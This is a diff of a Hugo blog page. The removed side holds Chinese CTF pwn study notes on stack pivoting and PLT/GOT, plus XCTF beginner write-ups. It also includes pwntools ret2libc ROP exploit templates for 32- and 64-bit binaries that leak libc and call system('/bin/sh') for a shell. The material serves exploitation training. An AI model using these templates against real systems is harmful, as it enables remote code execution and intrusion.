@@ -1,529 +1,431 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Title</title>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-    <link rel="stylesheet" href="https://shaodongshi.github.io/assets/css/main.css"/>
-    <link rel="canonical" href="https://shaodongshi.github.io/posts/">
-    <noscript><link rel="stylesheet" href="https://shaodongshi.github.io/assets/css/noscript.css"/></noscript>
-    <style>
-        :root{--site-background : url("https://shaodongshi.github.io/images/bg.jpg")};
-    </style> 
+  <head>
+    <title>Posts</title>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css"/>
+<link rel="stylesheet" href="/css/layouts/main.css"/>
+<link rel="stylesheet" href="/css/navigators/navbar.css"/>
+<link rel="stylesheet" href="/css/plyr.css"/>
+<link rel="stylesheet" href="/css/flag-icon.min.css"/>
+
+
+<link href="https://fonts.googleapis.com/css2?family=Muli:wght@300;400;500;600" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" />
+
+
+
+
+<meta property="og:title" content="Posts" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://shaodongshi.github.io/posts/" />
+
+
+
     
-    <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>
-</head>
+    
+    <link rel="stylesheet" href="/css/layouts/list.css">
+    <link rel="stylesheet" href="/css/navigators/sidebar.css">
+    
+    <link rel="stylesheet" href="/css/style.css"/>
 
 
-<body class="is-preload">
 
     
-        <div id="wrapper">
+    
+  </head>
 
-            
-                <header id="header">
-                    <div class="logo">
-                        <a href="/">
-                            <span class="icon">
-                                <img src="">
-                            </span>
-                        </a>
-                    </div>
-                    <div class="content">
-                        <div class="inner">
-                            <h1>Posts</h1>
-                            
-                        </div>
-                    </div>
-                    <nav>
-                        <ul>
-                            
-                                
-                                    
-                                        <li>
-                                            <a href="#5ps76ziy5liw55wmv1a">攻防世界WP</a>
-                                        </li>
-                                    
-                                
-                            
-                                
-                                    
-                                        <li>
-                                            <a href="#ugx05lioz290">Plt与got</a>
-                                        </li>
-                                    
-                                
-                            
-                                
-                                    
-                                        <li>
-                                            <a href="#mzlkvy3moijmuqllh7pyb3dmqkhmnb8">32位栈溢出rop模板</a>
-                                        </li>
-                                    
-                                
-                            
-                                
-                                    
-                                        <li>
-                                            <a href="#njtkvy3moijmuqllh7pyb3dmqkhmnb8o5peguelfkq">64位栈溢出rop模板(无PIE)</a>
-                                        </li>
-                                    
-                                
-                            
-                                
-                                    
-                                        <li>
-                                            <a href="#5qci6l%2bb56e75y6f55cg">栈迁移原理</a>
-                                        </li>
-                                    
-                                
-                            
-                        </ul>
-                    </nav>
-                </header>
+  <body data-spy="scroll" data-target="#TableOfContents" data-offset="80">
+    <div class="container-fluid bg-dimmed wrapper">
+      
+      
+    
 
-            
-                <div id="main">
 
-                    
-                        
-                            
-                                <article id="5qci6l&#43;b56e75y6f55cg">
-                                    <h2 class="major">栈迁移原理</h2>
-                                    <span class="image main"><img src="" alt="" /></span>
-                                    <h1 id="栈迁移原理">栈迁移原理</h1>
-<h2 id="0x1利用前提">0x1利用前提</h2>
-<p>1.存在栈溢出</p>
-<p>2.栈溢出可利用空间过小，无法写入较长的ROP链</p>
-<h2 id="0x2主要利用点">0x2主要利用点</h2>
-<pre><code class="language-assembly" data-lang="assembly">leave;
-ret;
-#其中leave -&gt;&gt; mov esp,ebp;
-#			  pop ebp;
-#其中ret -&gt;&gt;   pop eip;
-			  
-</code></pre><h2 id="0x3利用过程">0x3利用过程</h2>
-<p>假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：</p>
-<p><img src="/images1/image-20210718190622597.png" alt="image-20210718190622597"></p>
-<p><strong>其中leave_ret为代码leave;ret;地址。</strong></p>
-<p>而实际上在程序调用完成 call 返回的时候，就会有这样的 <code>mov esp,ebp</code> <code>pop ebp</code> <code>ret</code> 指令</p>
-<p>当我们挨个去执行的时候会出现这样的情况</p>
-<p>首先是 <code>mov esp,ebp</code> 执行完以后变成了这个样子：</p>
-<p><img src="/images1/image-20210718190852099.png" alt="image-20210718190852099"></p>
-<p>然后 <code>pop ebp</code> 执行完后就是</p>
-<p><strong>别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位</strong></p>
-<p><img src="/images1/image-20210718191020959.png" alt="image-20210718191020959"></p>
-<p>这时候就到 <code>ret</code> 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处</p>
-<p>构造的内容主要是把ebp1 _addr处写成  ebp2_addr 的地址</p>
-<p><strong>其中</strong></p>
-<p><img src="/images1/image-20210718192939078.png" alt="image-20210718192939078"></p>
-<p><strong>为read的参数</strong></p>
-<p><img src="/images1/image-20210718191509039.png" alt="image-20210718191509039"></p>
-<p>read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样</p>
-<p>首先是 <code>mov esp,ebp</code> 执行完成后效果如下：</p>
-<p><img src="/images1/image-20210718191600943.png" alt="image-20210718191600943"></p>
-<p>然后是 <code>pop ebp</code> 执行完成后：</p>
-<p><img src="/images1/image-20210718191924188.png" alt="image-20210718191924188"></p>
-<p><strong>esp依旧下移一个单位</strong></p>
-<p>此时再执行 <code>ret</code> 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数</p>
-<p><img src="/images1/image-20210718192318254.png" alt="image-20210718192318254"></p>
-<h2 id="0x4总结">0x4总结</h2>
-<p>栈迁移主要体现在对ebp和esp的控制(通过leave；ret；实现)在bss或data段来开辟一个可执行空间（伪造的栈），</p>
-<p>并在此执行ROP。</p>
 
-                                </article>
-                            
-                        
-                    
-                        
-                            
-                                <article id="njtkvy3moijmuqllh7pyb3dmqkhmnb8o5peguelfkq">
-                                    <h2 class="major">64位栈溢出rop模板(无PIE)</h2>
-                                    <span class="image main"><img src="" alt="" /></span>
-                                    <h1 id="64位栈溢出rop模板无pie">64位栈溢出rop模板（无PIE）</h1>
-<h2 id="exp模板">exp模板</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
-<span style="color:#75715e">#coding=utf-8</span>
-<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
-<span style="color:#75715e">#p = process(&#34;./&#34;)</span>
-p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;&#34;</span>,)
-elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./&#34;</span>)
 
-read_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>]
-puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
-main_addr <span style="color:#f92672">=</span> 
-pop_rdi <span style="color:#f92672">=</span> 
-<span style="color:#75715e">#************泄露got*********</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>() <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(read_got)
-payload<span style="color:#f92672">+=</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(main_addr) 
-<span style="color:#75715e">#payload = payload.ljust(200,&#39;b&#39;)</span>
-p<span style="color:#f92672">.</span>sendline( payload)
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&#39;</span>)
-read_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
-print hex(read_addr)
-<span style="color:#75715e">#*****************************</span>
-<span style="color:#75715e">#***********搜索libc，寻址*******</span>
-libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#34;read&#34;</span>,read_addr)
-offset <span style="color:#f92672">=</span> read_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;read&#34;</span>)
-sys_addr <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;system&#34;</span>)
-bin_sh_addr <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;str_bin_sh&#34;</span>)
-<span style="color:#75715e">#***************************</span>
-<span style="color:#75715e">#************get shell************</span>
-payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x40</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(bin_sh_addr) 
-payload1<span style="color:#f92672">+=</span> p64(sys_addr) 
-payload1 <span style="color:#f92672">=</span> payload1<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">200</span>,<span style="color:#e6db74">&#39;b&#39;</span>)
 
-p<span style="color:#f92672">.</span>sendline(payload1)
 
-p<span style="color:#f92672">.</span>interactive()
 
-</code></pre></div><h2 id="ropgadget">ROPgadget</h2>
-<p>ROPgadget &ndash;binary rop  &ndash;only &lsquo;pop|ret&rsquo; | grep &lsquo;eax&rsquo;
-查找可存储寄存器的代码</p>
-<p>ROPgadget &ndash;binary rop &ndash;string &ldquo;/bin/sh&rdquo;
-查找字符串</p>
-<p>ROPgadget &ndash;binary rop  &ndash;only &lsquo;int&rsquo;
-查找有int 0x80的地址</p>
-<h2 id="64位传参">64位传参</h2>
-<p>对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。</p>
 
-                                </article>
-                            
-                        
-                    
-                        
-                            
-                                <article id="mzlkvy3moijmuqllh7pyb3dmqkhmnb8">
-                                    <h2 class="major">32位栈溢出rop模板</h2>
-                                    <span class="image main"><img src="" alt="" /></span>
-                                    <h1 id="32位栈溢出rop模板无pie">32位栈溢出rop模板（无PIE）</h1>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
-<span style="color:#75715e">#coding=utf-8</span>
-<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
-process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./&#39;</span>
-<span style="color:#75715e">#p = process([process_name], env={&#39;LD_LIBRARY_PATH&#39;:&#39;./&#39;})</span>
-p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;&#39;</span>, )
-elf <span style="color:#f92672">=</span> ELF(process_name)
-<span style="color:#75715e">#**************泄露got并寻找libc</span>
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(payload):
-	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(偏移) <span style="color:#f92672">+</span> payload
-	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&#39;</span>, payload)
- 
-main_addr <span style="color:#f92672">=</span> 
-write_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;write&#39;</span>]
-write_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;write&#34;</span>]
 
-payload <span style="color:#f92672">=</span> p32(write_plt) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(write_got) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">4</span>)
-send_payload(payload)
-write_addr <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">4</span>))
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;write_addr =&gt; </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, write_addr)
- 
-libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#39;write&#39;</span>, write_addr)
-libc_base <span style="color:#f92672">=</span> write_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;write&#39;</span>)
-system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;system&#39;</span>)
-binsh_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;str_bin_sh&#39;</span>)
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system_addr =&gt; </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, system_addr)
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;binsh_addr =&gt; </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, binsh_addr)
-<span style="color:#75715e">#*********************</span>
-<span style="color:#75715e">#*********************调用system（“/bin/sh”）</span>
-select <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-<span style="color:#66d9ef">if</span> select <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
-	<span style="color:#75715e">#方案1</span>
-	payload <span style="color:#f92672">=</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(binsh_addr)
-<span style="color:#66d9ef">else</span>:
-	<span style="color:#75715e">#方案2</span>
-	read_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;read&#39;</span>]
-	pop3_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804856c</span>
-	bss_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>bss()
-	payload <span style="color:#f92672">=</span> p32(read_plt) <span style="color:#f92672">+</span> p32(pop3_ret) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(bss_addr) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">8</span>)
-	payload <span style="color:#f92672">+=</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(bss_addr)
-	payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
- 
-send_payload(payload)
- 
-<span style="color:#75715e">#****************************</span>
-p<span style="color:#f92672">.</span>interactive()
-</code></pre></div>
-                                </article>
-                            
-                        
-                    
-                        
-                            
-                                <article id="ugx05lioz290">
-                                    <h2 class="major">Plt与got</h2>
-                                    <span class="image main"><img src="" alt="" /></span>
-                                    <h1 id="plt与got理解">plt与got理解</h1>
-<h2 id="0x1-基础知识">0x1 基础知识</h2>
-<h3 id="got">.got</h3>
-<p>GOT(Global Offset Table)全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。</p>
-<h3 id="plt">.plt</h3>
-<p>PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址。</p>
-<h3 id="gotplt">.got.plt</h3>
-<p>这个是 GOT 专门为 PLT 专门准备的节。说白了，<strong>.got.plt 中的值是 GOT 的一部分</strong>。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。</p>
-<h3 id="pltgot">.plt.got</h3>
-<p>貌似没啥用。</p>
-<h2 id="0x2--理解">0x2  理解</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#960050;background-color:#1e0010">#</span>include &lt;stdio.h&gt;
-<span style="color:#960050;background-color:#1e0010">#</span>include &lt;stdlib.h&gt;
 
-<span style="color:#66d9ef">int</span> main(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> **argv)
-{
-    puts(<span style="color:#e6db74">&#34;Hello world!&#34;</span>);
-    puts(<span style="color:#e6db74">&#34;Hello CTF!&#34;</span>)
-    exit(<span style="color:#ae81ff">0</span>);
-}
-</code></pre></div><p>当调用第一次puts时，流程如下</p>
-<p><img src="/images1/one.png" alt="one"></p>
-<p>第二次调用puts时，流程如下</p>
-<p><img src="/images1/two.png" alt="two"></p>
-<h2 id="0x3-总结">0x3 总结</h2>
-<p>.plt 的作用简而言之就是先去 .got.plt 里面找地址，如果找的到，就去执行函数，如果是下一条指令的地址，说明没有，就会去触发链接器找到地址。</p>
-<p>.got.plt 显而易见用来存储地址，.got.plt 确实是 GOT 的一部分。</p>
+<nav class="navbar navbar-expand-xl top-navbar final-navbar shadow">
+  <div class="container">
+      <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button" onclick="toggleSidebar()">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <a class="navbar-brand" href="/">
+      My New Hugo Site</a>
+    <button class="navbar-toggler navbar-light" id="toc-toggler" type="button" onclick="toggleTOC()">
+      <span class="navbar-toggler-icon"></span>
+    </button>
 
-                                </article>
-                            
-                        
-                    
-                        
-                            
-                                <article id="5ps76ziy5liw55wmv1a">
-                                    <h2 class="major">攻防世界WP</h2>
-                                    <span class="image main"><img src="" alt="" /></span>
-                                    <h1 id="攻防世界wp">攻防世界WP</h1>
-<h2 id="新手区">新手区</h2>
-<h3 id="题目-get--shell">题目 get  shell</h3>
-<h4 id="题目描述">题目描述：</h4>
-<p>运行就能拿到shell呢，真的</p>
-<h4 id="题目分析">题目分析：</h4>
-<p>nc链接，运行，拿到shell</p>
-<h4 id="解题">解题：</h4>
-<p>1.nc链接IP（端口是空格）</p>
-<p><img src="/images/image-20201230121218856.png" alt="image-20201230121218856"></p>
-<p>2.ls查看文件，cat flag  获得flag</p>
-<p><img src="/images/image-20201230121305114.png" alt="image-20201230121305114"></p>
-<h3 id="题目-cgfsb">题目 CGfsb</h3>
-<h4 id="题目描述-1">题目描述：</h4>
-<p>菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用</p>
-<h4 id="题目分析-1">题目分析：</h4>
-<p>1.从题目描述来看，解题的关键是prinf</p>
-<p>2.查看文件格式，保护设置，运行一下</p>
-<p><img src="/images/image-20201230150149289.png" alt="image-20201230150149289"></p>
-<p><img src="/images/image-20201230150235986.png" alt="image-20201230150235986"></p>
-<p><img src="/images/image-20201230150336918.png" alt="image-20201230150336918"></p>
-<p>发现是一个32位的文件，开启了NX、Stack保护</p>
-<p><img src="/images/image-20201230150606994.png" alt="image-20201230150606994"></p>
-<p>这是程序的流程</p>
-<p>3.结合分析，应该和格式化字符串漏洞有关，放到IDA中具体看一下</p>
-<p><img src="/images/image-20201230151140410.png" alt="image-20201230151140410"></p>
-<p>这是一个高危漏洞！！！具体用法先放着，往下看。</p>
-<p><img src="/images/image-20201230150911401.png" alt="image-20201230150911401"></p>
-<p>看到这边有一个system函数，里面的内容是“cat flag”，这就是答案！！！</p>
-<p>而想要运行这行代码需要一个条件 pwnme==8，这时候想到前面有一个漏洞。</p>
-<p>4.格式化字符串漏洞的简单运用</p>
-<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表		示将0x64写入偏移10处保存的指针所指向的地址</p>
-<h4 id="解题-1">解题：</h4>
-<p>1.已经知道了存在格式化字符串漏洞，开始利用，查看偏移量</p>
-<p><img src="/images/image-20201230152812609.png" alt="image-20201230152812609"></p>
-<p>输入aaaa，发现0x61616161（aaaa）偏移量为10</p>
-<p>2.编写脚本</p>
-<p><img src="/images/image-20201230153908170.png" alt="image-20201230153908170"></p>
-<p>payload解释：将pwnme的地址转换为一个4字节的数，因为前面输出8个字符，通过%10$n，可以将8写入第10个偏移量对应的地址（pwenme的地址）里</p>
-<p>3.运行</p>
-<p><img src="/images/image-20201230154418227.png" alt="image-20201230154418227"></p>
-<p>拿到falg</p>
-<p>4.注：</p>
-<p>还可以这样写payload=‘aaaa’+p32（0x0804A068）+'%11$n'</p>
-<h3 id="题目-when_did_you_born">题目 when_did_you_born</h3>
-<h4 id="题目描述-2">题目描述：</h4>
-<p>只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办</p>
-<h4 id="题目分析-2">题目分析：</h4>
-<p>1.从描述来看，关键在于“年龄”</p>
-<p>2.查看文件格式，保护设置，运行一下</p>
-<p><img src="/images/image-20210106192203024.png" alt="image-20210106192203024"></p>
-<p>64位，开启了stack、NX保护。</p>
-<p><img src="/images/image-20210106192325605.png" alt="image-20210106192325605"></p>
-<p>这是程序基本流程。</p>
-<p>3.扔到IDA中看一下</p>
-<p><img src="/images/image-20210106192634693.png" alt="image-20210106192634693"></p>
-<p>答案就在这！！！</p>
-<p>整体看一下</p>
-<p><img src="/images/image-20210106192907254.png" alt="image-20210106192907254"></p>
-<p>所以思路很明显了，想办法去执行system就可以了。但问题是两个if不能一起执行。此时注意到前面有一个</p>
-<p><img src="/images/image-20210106193436330.png" alt="image-20210106193436330"></p>
-<p>漏洞……</p>
-<p>查看一下</p>
-<p><img src="/images/image-20210106195023052.png" alt="image-20210106195023052"></p>
-<p>v4下面正好是v5，那就可以直接覆盖了</p>
-<h4 id="解题-2">解题：</h4>
-<p><img src="/images/image-20210106195107572.png" alt="image-20210106195107572"></p>
-<p><img src="/images/image-20210106195145601.png" alt="image-20210106195145601"></p>
-<p>解决。</p>
-<h3 id="题目-hello_pwn">题目 hello_pwn</h3>
-<h4 id="题目描述-3">题目描述：</h4>
-<p>pwn！，segment fault! 菜鸡陷入了深思</p>
-<h4 id="题目分析-3">题目分析：</h4>
-<p>1.题目描述貌似没啥用，不管了</p>
-<p>2.查看文件，保护，运行一下</p>
-<p><img src="/images/image-20210107164704510.png" alt="image-20210107164704510"></p>
-<p>64位，开启了NX保护</p>
-<p><img src="/images/image-20210107164749946.png" alt="image-20210107164749946"></p>
-<p>就一句话……</p>
-<p>3.扔到IDA中看一下</p>
-<p><img src="/images/image-20210107165025779.png" alt="image-20210107165025779"></p>
-<p>可以看到只要运行这个函数就可以拿到flag</p>
-<p><img src="/images/image-20210107165102382.png" alt="image-20210107165102382"></p>
-<p>这是条件。</p>
-<p>这时候发现一个漏洞</p>
-<p><img src="/images/image-20210107165136562.png" alt="image-20210107165136562"></p>
-<p><img src="/images/image-20210107165150398.png" alt="image-20210107165150398"></p>
-<p>好了，可以直接利用溢出完成题目了</p>
-<h4 id="解题-3">解题：</h4>
-<p><img src="/images/image-20210107165552530.png" alt="image-20210107165552530"></p>
-<p><img src="/images/image-20210107165618691.png" alt="image-20210107165618691"></p>
-<p>完成。</p>
-<h3 id="题目-level0">题目 level0</h3>
-<h4 id="题目描述-4">题目描述：</h4>
-<p>菜鸡了解了什么是溢出，他相信自己能得到shell</p>
-<h4 id="题目分析-4">题目分析：</h4>
-<p>1.从分析来看，解题关键是拿到shell</p>
-<p>2.查看文件，保护，运行</p>
-<p><img src="/images/image-20210107212219583.png" alt="image-20210107212219583"></p>
-<p>64位，NX保护。</p>
-<p><img src="/images/image-20210107212327276.png" alt="image-20210107212327276"></p>
-<p>嗯，就一句话，没啥用。</p>
-<p>3.扔进IDA里面看一下</p>
-<p><img src="/images/image-20210107212507099.png" alt="image-20210107212507099"></p>
-<p>发现这个函数，那么只要让它执行这个函数，就可以拿到shell了。</p>
-<p><img src="/images/image-20210107212619490.png" alt="image-20210107212619490"></p>
-<p>发现这边有一个溢出。开始编写脚本。</p>
-<h4 id="解题-4">解题：</h4>
-<p>编写脚本</p>
-<h4 id="image-20210107213418120imagesimage-20210107213418120png"><img src="/images/image-20210107213418120.png" alt="image-20210107213418120"></h4>
-<p>利用一个溢出将callsystem函数的地址编写进去</p>
-<p><img src="/images/image-20210107213611957.png" alt="image-20210107213611957"></p>
-<p>完成。</p>
-<h3 id="题目-level2">题目 level2</h3>
-<h4 id="题目描述-5">题目描述：</h4>
-<p>菜鸡请教大神如何获得flag，大神告诉他‘使用’面向返回的编程（ROP）就可以了</p>
-<h4 id="题目分析-5">题目分析：</h4>
-<p>1.从题目描述可知，要用到ROP技术。</p>
-<p>2.查看文件格式，保护，运行。</p>
-<p><img src="/images/image-20210107215132075.png" alt="image-20210107215132075"></p>
-<p>32位，NX保护</p>
-<p><img src="/images/image-20210107215211149.png" alt="image-20210107215211149"></p>
-<p>程序流程。</p>
-<p>3.扔进IDA里看一下。</p>
-<p><img src="/images/image-20210107215433049.png" alt="image-20210107215433049"></p>
-<p>存在system函数，可以将‘/bin/sh’，写入，获得shell</p>
-<p><img src="/images/image-20210107215534512.png" alt="image-20210107215534512"></p>
-<p>存在溢出漏洞。可以开始编写脚本了</p>
-<h4 id="解题-5">解题：</h4>
-<p><img src="/images/image-20210107223902494.png" alt="image-20210107223902494"></p>
-<p>构建system（/bin/sh），获得shell</p>
-<p><img src="/images/image-20210107223948673.png" alt="image-20210107223948673"></p>
-<p>完成。</p>
-<h3 id="题目-string">题目 string</h3>
-<h4 id="题目描述-6">题目描述：</h4>
-<p>菜鸡遇到了Dragon,有一位巫师可以帮助他逃离危险，但似乎需要一些要求</p>
-<h4 id="题目分析-6">题目分析：</h4>
-<p>1.从题目描述来看，解题的关键在“巫师”</p>
-<p>2.查看文件格式，保护。</p>
-<p><img src="/images/image-20210108094737987.png" alt="image-20210108094737987"></p>
-<p>64位，保护除了PIE都开了。</p>
-<p>3.扔到IDA里面看一下。（400CA6）</p>
-<p><img src="/images/image-20210108095248994.png" alt="image-20210108095248994"></p>
-<p>ok，找到巫师了，不过，需要条件*a1==a1[1]。</p>
-<p><img src="/images/image-20210108095535279.png" alt="image-20210108095535279"></p>
-<p>观察一下，可以发现*a1==a1[1],即要满足 *v3==v3[1]。</p>
-<p><img src="/images/image-20210108095741998.png" alt="image-20210108095741998"></p>
-<p>这时候发现这边存在一个输出漏洞。（printf(&amp;……，&amp;……)）</p>
-<p>想到使用%n来修改值。</p>
-<p>查看一下偏移量。</p>
-<p><img src="/images/image-20210108100559729.png" alt="image-20210108100559729"></p>
-<p>偏移量是7。</p>
-<p>再来找一下地址。</p>
-<p><img src="/images/image-20210109191620499.png" alt="image-20210109191620499"></p>
-<p>这边泄露了v4地址，即v3</p>
-<p><img src="/images/image-20210108104853416.png" alt="image-20210108104853416"></p>
-<p>并且出现了可以将v1变成一个函数来执行外部命令的语句。</p>
-<h4 id="解题-6">解题：</h4>
-<p><img src="/images/image-20210109191719627.png" alt="image-20210109191719627"></p>
-<p><img src="/images/image-20210109191845878.png" alt="image-20210109191845878"></p>
-<p><img src="/images/image-20210109191915466.png" alt="image-20210109191915466"></p>
-<p>完成。</p>
-<h3 id="题目-int_overflow">题目 int_overflow</h3>
-<h4 id="题目描述-7">题目描述：</h4>
-<p>菜鸡感觉这题似乎没有办法溢出，真的么？</p>
-<h4 id="题目分析-7">题目分析：</h4>
-<p>1.从题目来看，这题解题关键在于“int_overflow”</p>
-<p>2.查看文件，保护，运行</p>
-<p><img src="/images/image-20210111200827431.png" alt="image-20210111200827431"></p>
-<p><img src="/images/image-20210111201002073.png" alt="image-20210111201002073"></p>
-<p>3.扔进IDA里面看一下</p>
-<p><img src="/images/image-20210111201440496.png" alt="image-20210111201440496"></p>
-<p>一个溢出漏洞</p>
-<p><img src="/images/image-20210111201508483.png" alt="image-20210111201508483"></p>
-<p>条件</p>
-<p>这时候联想到题目的提示int_overflow</p>
-<p><img src="/images/image-20210111201549472.png" alt="image-20210111201549472"></p>
-<p>无符号int型，最大256，257开始长度变为1</p>
-<p><img src="/images/image-20210111202408010.png" alt="image-20210111202408010"></p>
-<p>又发现这个……</p>
-<h4 id="解题-7">解题：</h4>
-<p><img src="/images/image-20210111202818786.png" alt="image-20210111202818786"></p>
-<p><img src="/images/image-20210111202909100.png" alt="image-20210111202909100"></p>
-<p><img src="/images/image-20210111202841356.png" alt="image-20210111202841356"></p>
-<p>完成。</p>
-<h3 id="题目-cgpwn2">题目 cgpwn2</h3>
-<h4 id="题目描述-8">题目描述：</h4>
-<p>菜鸡认为自己需要一个字符串</p>
-<h4 id="题目分析-8">题目分析：</h4>
-<p>1.查看文件，保护，运行。</p>
